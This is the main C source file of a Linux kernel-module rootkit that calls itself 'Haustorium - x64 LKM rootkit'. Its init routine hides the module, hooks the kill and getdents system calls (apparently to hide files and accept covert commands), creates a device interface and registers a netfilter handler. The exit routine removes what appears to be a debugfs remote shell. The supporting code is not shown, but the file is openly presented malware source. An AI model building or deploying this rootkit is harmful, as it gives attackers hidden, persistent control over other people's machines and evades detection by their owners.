#include <linux/init.h>
#include <linux/module.h>

#include "cdd.h"
#include "config.h"
#include "debugfs.h"
#include "evasion.h"
#include "htm.h"
#include "hook.h"
#include "netfilter.h"
#include "sys_getdents.h"
#include "sys_kill.h"

static notrace int __init htm_init(void)
{
	#ifdef HTM_DEBUG
	htm_pr_notice("initializing");
	#endif

	#ifdef HTM_INIT_HIDE_MODULE
	htm_hide_module();
	#endif

	#ifdef HTM_INIT_INTERFACE_CDD
	htm_cdd_create();
	#endif

	#ifdef HTM_INIT_INTERFACE_SYS_KILL
	htm_hook_install(&hook_sys_kill);
	#endif

	#ifdef HTM_INIT_HIDE_FS
	htm_hook_install(&hook_sys_getdents);
	htm_hook_install(&hook_sys_getdents64);
	#endif

	#ifdef HTM_INIT_INTERFACE_NETFILTER
	htm_netfilter_register();
	#endif

	#ifdef HTM_DEBUG
	htm_pr_info("module loaded");
	#endif

	return 0;
}

static notrace void __exit htm_exit(void)
{
	#ifdef HTM_DEBUG
	htm_pr_info("terminating");
	#endif

	htm_debugfs_rsh_remove();

	htm_netfilter_unregister();

	htm_hook_uninstall(&hook_sys_getdents64);
	htm_hook_uninstall(&hook_sys_getdents);
	htm_hook_uninstall(&hook_sys_kill);

	htm_show_module();

	htm_cdd_destroy();

	#ifdef HTM_DEBUG
	htm_pr_notice("module unloaded");
	#endif
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hiatus");
MODULE_DESCRIPTION("Haustorium - x64 LKM rootkit");
MODULE_VERSION("0.01");

module_init(htm_init);
module_exit(htm_exit);
